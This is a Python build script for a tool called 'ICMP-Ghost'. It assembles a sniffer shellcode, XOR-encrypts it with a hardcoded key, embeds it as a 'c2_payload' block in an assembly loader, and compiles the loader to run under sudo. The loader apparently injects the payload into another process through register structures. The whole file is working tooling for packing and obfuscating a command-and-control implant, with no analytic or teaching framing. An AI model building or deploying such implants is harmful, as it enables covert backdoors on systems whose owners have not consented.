#!/usr/bin/env python3
"""
ICMP-Ghost Automated Build Script
Compiles sniff.asm → encrypts → patches loader.asm → compiles loader

SETUP: Add '; BUILD_SIZE' comment to the 3 size lines in loader.asm:
  mov qword [user_regs_struct + 104], 2531  ; BUILD_SIZE
  mov r12, 2531                              ; BUILD_SIZE
  mov qword [working_user_regs_struct + 104], 2531  ; BUILD_SIZE

Usage: python3 build.py
"""

import re
import sys
import subprocess

KEY_BYTES = [0x37, 0x13, 0xBC, 0xA2, 0xBB, 0xAB, 0xDA, 0xAC]

def step(msg): print(f"[*] {msg}")
def ok(msg):   print(f"[+] {msg}")
def err(msg):  print(f"[-] ERROR: {msg}"); sys.exit(1)

# ── 1. Compile sniff.asm ──────────────────────────────────────────────────────
step("Compiling sniff.asm...")
r = subprocess.run(["nasm", "-f", "bin", "sniff.asm", "-o", "shellcode.bin"],
                   capture_output=True, text=True)
if r.returncode != 0:
    err(f"nasm failed:\n{r.stderr}")

with open("shellcode.bin", "rb") as f:
    raw = f.read()
new_size = len(raw)
ok(f"shellcode.bin → {new_size} bytes")

# ── 2. XOR encrypt ───────────────────────────────────────────────────────────
step("XOR encrypting...")
encrypted = [b ^ KEY_BYTES[i % 8] for i, b in enumerate(raw)]
ok(f"Encrypted {new_size} bytes")

# ── 3. Generate NASM payload block ───────────────────────────────────────────
lines = ["c2_payload:"]
for i in range(0, len(encrypted), 12):
    chunk = encrypted[i:i+12]
    lines.append("\tdb " + ", ".join(f"0x{b:02x}" for b in chunk))
new_payload_block = "\n".join(lines)

# ── 4. Read loader.asm ───────────────────────────────────────────────────────
step("Reading loader.asm...")
with open("loader.asm", "r") as f:
    content = f.read()

# ── 5. Check BUILD_SIZE tags exist ───────────────────────────────────────────
step("Checking BUILD_SIZE tags...")
if "; BUILD_SIZE" not in content:
    err("No ; BUILD_SIZE tag found in loader.asm\n"
        "Add it to 3 lines:\n"
        "  mov qword [user_regs_struct + 104], 2531  ; BUILD_SIZE\n"
        "  mov r12, 2531                              ; BUILD_SIZE\n"
        "  mov qword [working_user_regs_struct + 104], 2531  ; BUILD_SIZE")

# ── 6. Replace c2_payload block ──────────────────────────────────────────────
step("Patching c2_payload block...")
pat = re.compile(r'c2_payload:\s*\n(?:\t+db [^\n]*\n)+', re.MULTILINE)
if not pat.search(content):
    err("c2_payload block not found in loader.asm")
content = pat.sub(new_payload_block + "\n", content)
ok("c2_payload replaced")

# ── 7. Replace ALL BUILD_SIZE tagged lines ────────────────────────────────────
# Strategy: replace ANY \d+ on lines containing ; BUILD_SIZE
# No old_size needed — works even if values are inconsistent
step(f"Replacing all BUILD_SIZE lines → {new_size}...")
count = [0]

def replace_last_number(m):
    """Replace the last \d+ before the ; BUILD_SIZE comment."""
    count[0] += 1
    line = m.group(0)
    # Find last number before the comment
    return re.sub(r'(\b\d+\b)(\s*;[^\n]*BUILD_SIZE.*)', 
                  lambda n: str(new_size) + n.group(2), 
                  line)

content = re.sub(r'[^\n]*;[^\n]*BUILD_SIZE[^\n]*', replace_last_number, content)
ok(f"Replaced {count[0]} BUILD_SIZE line(s)")

# ── 8. Verify all BUILD_SIZE lines now have correct value ────────────────────
bad = []
for line in content.splitlines():
    if "BUILD_SIZE" in line and ";" in line:
        nums = re.findall(r'\b(\d+)\b(?=[^;]*$)', line.split(";")[0])
        if nums and int(nums[-1]) != new_size:
            bad.append(line.strip())
if bad:
    print("  [!] Warning — these BUILD_SIZE lines may be wrong:")
    for l in bad: print(f"      {l}")
else:
    ok("All BUILD_SIZE lines verified ✓")

# ── 9. Write patched loader.asm ──────────────────────────────────────────────
with open("loader.asm", "w") as f:
    f.write(content)
ok("loader.asm written")

# ── 10. Sync xor.py raw_asm ──────────────────────────────────────────────────
step("Syncing xor.py raw_asm...")
raw_lines = []
for i in range(0, len(raw), 12):
    chunk = raw[i:i+12]
    raw_lines.append("\tdb " + ", ".join(f"0x{b:02x}" for b in chunk))
new_raw_asm = "\n".join(raw_lines)

with open("xor.py", "r") as f:
    xor = f.read()
xor = re.sub(r'raw_asm = """.*?"""', f'raw_asm = """\n{new_raw_asm}\n"""',
             xor, flags=re.DOTALL)
with open("xor.py", "w") as f:
    f.write(xor)
ok("xor.py synced")

# ── 11. Compile loader ────────────────────────────────────────────────────────
step("Compiling loader.asm...")
r = subprocess.run(["nasm", "-f", "elf64", "loader.asm", "-o", "loader.o"],
                   capture_output=True, text=True)
if r.returncode != 0:
    err(f"nasm loader failed:\n{r.stderr}")
r = subprocess.run(["ld", "loader.o", "-o", "loader"],
                   capture_output=True, text=True)
if r.returncode != 0:
    err(f"ld failed:\n{r.stderr}")
ok("loader compiled")

print()
print("=" * 50)
ok(f"Build complete! {new_size} bytes → sudo ./loader")
print("=" * 50)
